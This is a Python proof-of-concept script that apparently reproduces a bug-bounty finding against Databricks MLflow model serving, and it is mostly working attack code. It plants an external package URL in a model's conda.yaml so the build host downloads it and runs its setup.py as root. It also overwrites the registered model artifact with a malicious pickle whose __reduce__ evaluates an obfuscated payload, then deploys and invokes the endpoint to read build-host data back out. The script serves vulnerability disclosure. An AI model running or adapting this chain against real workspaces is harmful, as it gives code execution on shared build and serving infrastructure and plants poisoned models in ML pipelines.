"""
run_chain.py — end-to-end reproduction of HackerOne report #4076059.

Registers an MLflow model whose conda.yaml carries an absolute-URL requirement line,
deploys it to a serving endpoint, and invokes the endpoint. The build host fetches the
URL, executes its setup.py as root, and the probe's setup.py stamps the build host's
identity into the package it is building. The predict path below reads that stamped
file back out of site-packages and returns it through the inference response.

Benign end to end: the probe reads hostname / uname / id / cwd / listings / env var
NAMES, makes no network calls, and writes nothing outside the wheel. The predict payload
below only reads a file inside the serving image — no network, no writes.

Usage:
    export DATABRICKS_HOST=https://<workspace>.cloud.databricks.com
    export DATABRICKS_TOKEN=dapi...
    python run_chain.py [--url <sdist-url>] [--endpoint <name>] [--model <uc-name>]

    --invoke-only    skip logging/registering, just poll and invoke the current endpoint
    --no-deploy      log, register and tamper, but leave the endpoint alone
"""

import argparse
import json
import os
import pickle
import sys
import time

import requests
import statsmodels.api as sm

import mlflow
import mlflow.artifacts as A
import mlflow.tracking as T
from mlflow.store.artifact.artifact_repository_registry import get_artifact_repository

DEFAULT_URL = (
    "https://github.com/bootmoha639-beep/dbx-build-probe/releases/download/v3/"
    "zzbuildprobe-1.2.0.tar.gz"
)
DEFAULT_MODEL = "workspace.hunt.hunt_model"
DEFAULT_ENDPOINT = "hunt-ep"


# ---------------------------------------------------------------- the registered env
# This is the whole finding: one absolute-URL line among ordinary pins. The internal
# mirror, the channel rewrite and the local-file stripping all still apply — this form
# is simply not covered by them.
def conda_env(url):
    return {
        "name": "mlflow-env",
        "channels": ["conda-forge"],
        "dependencies": [
            "python=3.12.10",
            "pip<=25.0.1",
            {
                "pip": [
                    url,
                    "mlflow==3.16.1",
                    "numpy==2.5.3",
                    "pandas==3.0.6",
                    "scipy==1.18.1",
                    "statsmodels==0.15.0",
                ]
            },
        ],
    }


# ------------------------------------------------------------------- the read payload
# Evaluated inside the serving container when the pickled model is loaded. It resolves
# zzbuildprobe.build_evidence, executes the stamped file, and returns the EVIDENCE dict
# that the build host's setup.py wrote there during the image build.
READ_EXPR = """
(lambda _s: type('P', (), {
    'model': property(lambda s: s),
    'predict': lambda self, *a, **k: __import__('json').dumps(
        (lambda _d: {
            'serving_host': __import__('socket').gethostname(),
            'build_evidence_file': _s.origin,
            'EVIDENCE': (exec(open(_s.origin).read(), _d), _d.get('EVIDENCE'))[1],
        })({})
        if _s else
        {
            'serving_host': __import__('socket').gethostname(),
            'error': 'zzbuildprobe.build_evidence is not installed in this image',
        },
        default=str,
    ),
}))(
    (lambda _p: __import__('importlib.util').util.find_spec('zzbuildprobe.build_evidence')
     if _p else None)(
        __import__('importlib.util').util.find_spec('zzbuildprobe')))
"""


class ReadBack:
    """Pickles into eval(READ_EXPR), which yields the class the loader calls predict on."""

    def __reduce__(self):
        return (eval, (READ_EXPR,))


# ----------------------------------------------------------------------------- helpers
def api(host, token, method, path, **kw):
    return requests.request(
        method,
        f"{host}{path}",
        headers={"Authorization": f"Bearer {token}"},
        timeout=kw.pop("timeout", 60),
        **kw,
    )


def whoami(host, token):
    r = api(host, token, "GET", "/api/2.0/preview/scim/v2/Me")
    r.raise_for_status()
    return r.json()["userName"]


def ensure_uc(host, token, catalog, schema):
    """Make sure the target catalog and schema exist — a fresh workspace has neither."""
    r = api(host, token, "GET", f"/api/2.1/unity-catalog/catalogs/{catalog}")
    if r.status_code != 200:
        names = [
            c["name"]
            for c in api(host, token, "GET", "/api/2.1/unity-catalog/catalogs")
            .json()
            .get("catalogs", [])
        ]
        print(f"[!] catalog '{catalog}' not found. Available catalogs: {names}")
        print(f"    re-run with --model <catalog>.{schema}.<model>")
        sys.exit(1)
    print(f"[=] catalog {catalog} OK")

    r = api(host, token, "GET", f"/api/2.1/unity-catalog/schemas/{catalog}.{schema}")
    if r.status_code == 200:
        print(f"[=] schema {catalog}.{schema} OK")
        return
    r = api(
        host, token, "POST", "/api/2.1/unity-catalog/schemas",
        json={"name": schema, "catalog_name": catalog},
    )
    print(f"[+] create schema {catalog}.{schema} HTTP {r.status_code}: {r.text[:160]}")


def get_endpoint(host, token, name):
    r = api(host, token, "GET", f"/api/2.0/serving-endpoints/{name}")
    return r.json() if r.status_code == 200 else None


def wait_ready(host, token, name, version, tries=90, delay=20):
    for i in range(tries):
        time.sleep(delay)
        s = get_endpoint(host, token, name)
        if not s:
            print(f"    poll {i}: endpoint not visible yet", flush=True)
            continue
        st = s.get("state", {})
        ents = (
            (s.get("config") or {}).get("served_entities")
            or (s.get("pending_config") or {}).get("served_entities")
            or [{}]
        )
        ent = ents[0]
        dep = (ent.get("state") or {}).get("deployment")
        print(
            f"    poll {i}: ready={st.get('ready')} update={st.get('config_update')} "
            f"entity={ent.get('name')} deploy={dep}",
            flush=True,
        )
        if st.get("ready") == "ENDPOINT_STATE_FAILED":
            print("[!] endpoint reported FAILED")
            return False
        if (
            st.get("ready") == "READY"
            and st.get("config_update") == "NOT_UPDATING"
            and ent.get("name") == f"hunt-model-{version}"
            and dep == "DEPLOYMENT_READY"
        ):
            return True
    print("[!] timed out waiting for READY")
    return False


def invoke(host, token, name, out_path):
    body = {"inputs": [[1.0, 0.5]]}
    print(f"[*] POST /serving-endpoints/{name}/invocations  body={json.dumps(body)}")
    r = api(
        host, token, "POST", f"/serving-endpoints/{name}/invocations",
        json=body, timeout=300,
    )
    print(f"[+] invocations HTTP {r.status_code}")
    with open(out_path, "w") as f:
        f.write(f"HTTP {r.status_code}\n{r.text}\n")
    try:
        pred = r.json().get("predictions")
        pretty = json.loads(pred) if isinstance(pred, str) else pred
        print(json.dumps(pretty, indent=2)[:4000])
    except Exception:
        print(r.text[:2000])
    return r


def show_pip_section(art_uri):
    """Print the pip block of the model's own conda.yaml, as published to the registry."""
    try:
        path = A.download_artifacts(artifact_uri=f"{art_uri}/conda.yaml")
        lines = open(path).read().splitlines()
        start = next(i for i, l in enumerate(lines) if l.strip() == "pip:")
        print("[*] registered conda.yaml, pip section (from the registry):")
        for l in lines[start:start + 10]:
            print("    " + l)
    except Exception as e:
        print(f"[!] could not read back conda.yaml: {str(e)[:160]}")


# -------------------------------------------------------------------------------- main
def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", default=DEFAULT_URL)
    p.add_argument("--model", default=DEFAULT_MODEL)
    p.add_argument("--endpoint", default=DEFAULT_ENDPOINT)
    p.add_argument("--invoke-only", action="store_true")
    p.add_argument("--no-deploy", action="store_true")
    args = p.parse_args()

    host = os.environ["DATABRICKS_HOST"].rstrip("/")
    token = os.environ["DATABRICKS_TOKEN"]
    mlflow.set_tracking_uri("databricks")
    mlflow.set_registry_uri("databricks-uc")

    version = None

    if not args.invoke_only:
        from mlflow.models import infer_signature

        catalog, schema, _model = args.model.split(".")
        ensure_uc(host, token, catalog, schema)

        mlflow.set_experiment(f"/Users/{whoami(host, token)}/hunt-exp")

        # 1. a genuine model, so the registration itself is unremarkable
        X = sm.add_constant([[0.0], [1.0], [2.0]])
        fit = sm.OLS([0.1, 1.1, 2.1], X).fit()
        sig = infer_signature(X, fit.predict(X))

        with mlflow.start_run(run_name="hunt-run-url-requirement") as run:
            mi = mlflow.statsmodels.log_model(
                fit, "model",
                signature=sig,
                input_example=X,
                conda_env=conda_env(args.url),  # the URL lands in the model's conda.yaml
            )
            run_id = run.info.run_id
        print(f"[+] logged run {run_id}, model_id {mi.model_id}")

        # 2. swap the model artifact for one that reads the stamped file back
        client = T.MlflowClient()
        art_uri = client.get_logged_model(mi.model_id).artifact_location.rstrip("/")
        local = A.download_artifacts(artifact_uri=f"{art_uri}/model.statsmodels")
        with open(local, "wb") as f:
            pickle.dump(ReadBack(), f)
        get_artifact_repository(art_uri).log_artifact(local, artifact_path=None)
        try:
            client.log_artifact(run_id, local, "model")
        except Exception as e:
            print(f"[!] run-artifact mirror failed: {str(e)[:150]}")
        print(f"[+] payload written to {art_uri}/model.statsmodels")

        show_pip_section(art_uri)

        # 3. register — comes back READY with no gate or warning
        mv = mlflow.register_model(f"runs:/{run_id}/model", args.model)
        version = mv.version
        print(f"[+] registered {args.model} v{version} status={mv.status}")

    if args.no_deploy:
        print("[=] --no-deploy: stopping before the endpoint is touched")
        return

    # 4. point the endpoint at this version
    if version:
        cfg = {
            "served_entities": [{
                "name": f"hunt-model-{version}",
                "entity_name": args.model,
                "entity_version": version,
                "workload_size": "Small",
                "scale_to_zero_enabled": True,
            }],
            "traffic_config": {
                "routes": [{
                    "served_model_name": f"hunt-model-{version}",
                    "traffic_percentage": 100,
                }]
            },
        }
        if get_endpoint(host, token, args.endpoint) is None:
            r = api(host, token, "POST", "/api/2.0/serving-endpoints",
                    json={"name": args.endpoint, "config": cfg})
            print(f"[+] create endpoint HTTP {r.status_code}: {r.text[:200]}")
        else:
            r = api(host, token, "PUT",
                    f"/api/2.0/serving-endpoints/{args.endpoint}/config", json=cfg)
            print(f"[+] update endpoint HTTP {r.status_code}: {r.text[:200]}")

        if not wait_ready(host, token, args.endpoint, version):
            sys.exit(2)
        print("[+] endpoint READY")

    invoke(host, token, args.endpoint, "INVOCATION_FINAL.json")


if __name__ == "__main__":
    main()
